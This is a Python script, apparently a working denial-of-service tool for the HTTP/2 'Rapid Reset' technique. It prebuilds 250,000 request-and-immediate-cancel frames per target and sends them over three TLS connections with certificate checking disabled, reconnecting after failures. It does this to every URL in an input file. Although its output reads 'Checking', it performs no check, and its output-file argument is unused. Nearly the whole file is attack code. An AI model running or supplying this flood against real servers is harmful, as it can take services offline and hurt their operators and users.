#!/usr/bin/env python
# encoding: utf-8

import ssl
import csv
import socket
import httpx
import argparse
from h2.connection import H2Connection
from h2.config import H2Configuration
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse
from datetime import datetime
import requests
import time

def get_source_ips(proxies):
    try:
        response = requests.get('http://ifconfig.me', timeout=5, proxies=proxies)
        external_ip = response.text.strip()

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        try:
            s.connect(('8.8.8.8', 1))
            internal_ip = s.getsockname()[0]
        except socket.timeout:
            internal_ip = '127.0.0.1'
        except Exception as e:
            internal_ip = '127.0.0.1'
        finally:
            s.close()
        
        return internal_ip, external_ip
    except requests.exceptions.Timeout:
        print("External IP request timed out.")
        return None, None
    except Exception as e:
        print(f"Error: {e}")
        return None, None

send_data_list = []

def construct_h2(host, uri_path):
    config = H2Configuration(client_side=True)
    h2_conn = H2Connection(config=config)
    h2_conn.initiate_connection()
    h2_conn.data_to_send()

    req_per_send = 5000
    req_num = 50

    global send_data_list

    index = 0
    for i in range(req_num):
        send_data = None

        for j in range(req_per_send):
            headers = [(':method', 'GET'), (':authority', host), (':scheme', 'https'), (':path', uri_path)]
            h2_conn.send_headers(1 + index * 2, headers)
            if send_data == None:
                send_data = h2_conn.data_to_send()
            else:
                send_data = send_data + h2_conn.data_to_send()
            h2_conn.reset_stream(1 + index * 2)
            send_data = send_data + h2_conn.data_to_send()

            index = index + 1

        send_data_list.append(send_data)

def send_rst_stream_h2(host, port, stream_id, uri_path='/', timeout=5, proxy=None):
    # global send_data
    send_data = None
    h2_conn =  None
    connection_nums = 3
    conns = []

    global send_data_list

    for i in range(connection_nums):
        # Create an SSL context to ignore SSL certificate verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_context.set_alpn_protocols(["h2"])

        # Create a connection based on whether a proxy is used
        if proxy and proxy != "":
            proxy_parts = urlparse(proxy)
            conn = HTTPSConnection(proxy_parts.hostname, proxy_parts.port, timeout=timeout, context=ssl_context)
            conn.set_tunnel(host, port)
        else:
            conn = HTTPSConnection(host, port, timeout=timeout, context=ssl_context)

        conn.connect()

        # Initiate HTTP/2 connection
        config = H2Configuration(client_side=True)
        h2_conn = H2Connection(config=config)
        h2_conn.initiate_connection()
        conn.send(h2_conn.data_to_send())
        # data = h2_conn.data_to_send()

        conns.append(conn)

    for k in range(len(send_data_list)):
        for i in range(connection_nums):
            try:
                print("send: ", len(send_data_list[k]))
                conns[i].send(send_data_list[k])
            except:
                print("send except ", len(send_data_list[k]))
                conns[i].close()

                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                ssl_context.set_alpn_protocols(["h2"])

                # Create a connection based on whether a proxy is used
                if proxy and proxy != "":
                    proxy_parts = urlparse(proxy)
                    conn = HTTPSConnection(proxy_parts.hostname, proxy_parts.port, timeout=timeout, context=ssl_context)
                    conn.set_tunnel(host, port)
                else:
                    conn = HTTPSConnection(host, port, timeout=timeout, context=ssl_context)

                conn.connect()

                # Initiate HTTP/2 connection
                config = H2Configuration(client_side=True)
                h2_conn = H2Connection(config=config)
                h2_conn.initiate_connection()
                conn.send(h2_conn.data_to_send())
                # data = h2_conn.data_to_send()

                conns[i] = conn

    # conn.close()

def extract_hostname_port_uri(url):
    """
    Extract the hostname, port, and URI from a URL.
    
    Parameters:
        url (str): The URL to extract from.
        
    Returns:
        tuple: (hostname, port, uri)
    """
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port
        scheme = parsed_url.scheme
        uri = parsed_url.path  # Extracting the URI
        if uri == "":
            uri = "/"

        if not hostname:
            return -1, -1, ""

        if port:
            return hostname, port, uri

        if scheme == 'http':
            return hostname, 80, uri

        if scheme == 'https':
            return hostname, 443, uri

        return hostname, (80, 443), uri
    except Exception as e:
        return -1, -1, ""

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--input', required=True)
    parser.add_argument('-o', '--output', required=True)
    parser.add_argument('--proxy', help='HTTP/HTTPS proxy URL', default=None)
    args = parser.parse_args()

    proxies = {}
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy,
        }

    internal_ip, external_ip = get_source_ips(proxies)

    with open(args.input) as infile:
        for line in infile:
            addr = line.strip()
            if addr != "":
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print(f"Checking {addr}...")
                
                hostname, port, uri = extract_hostname_port_uri(addr)
                
                print("prepare http2 package ...")
                construct_h2(hostname, uri)
                print("send http2 package ...")
                send_rst_stream_h2(hostname, port, 1, uri)
                print("send finish")

